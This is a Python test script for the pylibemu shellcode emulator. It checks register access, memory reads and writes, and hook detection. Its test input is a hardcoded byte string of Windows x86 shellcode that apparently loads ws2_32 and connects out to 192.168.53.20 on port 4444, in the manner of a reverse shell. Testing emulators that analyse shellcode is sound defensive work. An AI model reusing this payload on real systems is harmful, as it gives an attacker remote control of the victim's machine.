#!/usr/bin/env python
#
# cpu_mem_test.py
#
# Copyright(c) 2011-2022 Angelo Dell'Aera <buffer@antifork.org>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston,
# MA  02111-1307  USA

import pylibemu
import logging

log = logging.getLogger("pylibemu")

regs32 = ('eax', 
          'ecx', 
          'edx', 
          'ebx', 
          'esp', 
          'ebp', 
          'esi', 
          'edi')

regs16 = ('ax', 
          'cx', 
          'dx', 
          'bx', 
          'sp', 
          'bp', 
          'si', 
          'di')

regs8  = ('al', 
          'cl', 
          'dl', 
          'bl', 
          'ah', 
          'ch', 
          'dh', 
          'bh')

shellcode  = b"\xfc\x6a\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d"
shellcode += b"\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34"
shellcode += b"\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0"
shellcode += b"\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9"
shellcode += b"\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c"
shellcode += b"\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c"
shellcode += b"\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32"
shellcode += b"\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53"
shellcode += b"\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02"
shellcode += b"\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6"
shellcode += b"\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3"
shellcode += b"\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50"
shellcode += b"\x53\x57\x53\x66\xb9\xc0\x38\xff\xe6"

emulator = pylibemu.Emulator()
offset   = emulator.shellcode_getpc_test(shellcode)

for i in range(0, 7):
    log.warning("%s => %s"  % (regs32[i], hex(emulator.cpu_reg32_get(i)), ))
    log.warning("%s  => %s" % (regs16[i], hex(emulator.cpu_reg16_get(i)), ))
    log.warning("%s  => %s" % (regs8[i] , hex(emulator.cpu_reg8_get(i)) , ))

log.warning(emulator.cpu_get_current_instruction().decode('utf-8'))

emulator.memory_write_dword(emulator.cpu_reg32_get(i), 0x41424344)

log.warning(emulator.cpu_get_current_instruction().decode('utf-8'))

dword = emulator.memory_read_dword(emulator.cpu_reg32_get(i))
assert dword == 0x41424344

log.warning(emulator.cpu_get_current_instruction().decode('utf-8'))

word = emulator.memory_read_word(emulator.cpu_reg32_get(i))
assert word == 0x4344

log.warning(emulator.cpu_get_current_instruction().decode('utf-8'))

byte = emulator.memory_read_byte(emulator.cpu_reg32_get(i))
assert byte == 0x44

log.warning(emulator.cpu_get_current_instruction().decode('utf-8'))

emulator.memory_segment_select(5)
assert emulator.memory_segment_get() == 5

log.warning(emulator.cpu_get_current_instruction().decode('utf-8'))

eip = emulator.cpu_eip_get()
log.warning(hex(eip))

dword = emulator.memory_read_dword(eip)
log.warning(hex(dword))

word = emulator.memory_read_word(eip)
log.warning(hex(word))

byte = emulator.memory_read_byte(eip)
log.warning(hex(byte))

block = emulator.memory_read_block(eip, 4)
#log.warning('0x' + ''.join(["%02x" % ord(x) for x in block[::-1]]))

log.warning(emulator.cpu_get_current_instruction().decode('utf-8'))

emulator.memory_write_dword(emulator.cpu_reg32_get(i), 0x00414243)
s = emulator.memory_read_string(emulator.cpu_reg32_get(i), 4)
log.warning(s.decode('utf-8'))

log.warning(emulator.env_w32_hook_check())
